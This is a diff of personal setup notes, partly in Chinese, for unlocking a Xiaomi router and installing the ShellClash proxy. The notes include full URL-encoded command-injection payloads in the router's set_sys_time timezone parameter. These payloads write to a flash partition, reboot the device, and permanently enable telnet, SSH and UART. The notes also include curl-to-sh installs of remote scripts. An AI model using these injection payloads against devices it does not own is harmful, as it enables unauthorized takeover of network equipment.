@@ -31,10 +31,11 @@ the following url should be further edited, replacing {token} by the string gett
 # enable debug mode, the page showed {code: 0}, which indicates that everything is ok
 http://192.168.31.1/cgi-bin/luci/;stok={token}/api/misystem/set_sys_time?timezone=%20%27%20%3B%20zz%3D%24%28dd%20if%3D%2Fdev%2Fzero%20bs%3D1%20count%3D2%202%3E%2Fdev%2Fnull%29%20%3B%20printf%20%27%A5%5A%25c%25c%27%20%24zz%20%24zz%20%7C%20mtd%20write%20-%20crash%20%3B%20
 
-# reboot the router (NB: after reboot the token changed accordingly)
+# reboot the router by checking this url 
 http://192.168.31.1/cgi-bin/luci/;stok={token}/api/misystem/set_sys_time?timezone=%20%27%20%3b%20reboot%20%3b%20
 
 # enable telnet permanently, the page showed {code: 0} prove that we success
+# (NB: after reboot the token changed accordingly)
 http://192.168.31.1/cgi-bin/luci/;stok={token}/api/misystem/set_sys_time?timezone=%20%27%20%3B%20bdata%20set%20telnet_en%3D1%20%3B%20bdata%20set%20ssh_en%3D1%20%3B%20bdata%20set%20uart_en%3D1%20%3B%20bdata%20commit%20%3B%20
 
 # reboot another once
@@ -120,15 +121,19 @@ export url='https://raw.githubusercontent.com/juewuy/ShellClash/master' && sh -c
 # or
 export url='https://fastly.jsdelivr.net/gh/juewuy/ShellClash@master' && sh -c "$(curl -kfsSl $url/install.sh)" && source /etc/profile &> /dev/null
 
+crash # 配置向导
+
 # 显示安装成功
 clash # 进入clash 安装配置向导
 
 # ui dashboard 安装不了, 跳过dashboard, 直接安装 clash
+# 通过订阅链接在线生成配置, 会自动安装 clash core
+
 # clash 启动后, 在更新彩灯中安装 ui 即可
 # http://clash.razord.top/#/proxies
 # http://192.168.31.1:9999/ui/#/proxies
 
-
+# 或者访问 http://192.168.31.1:9999/ui/
 
 
 # 本地安装
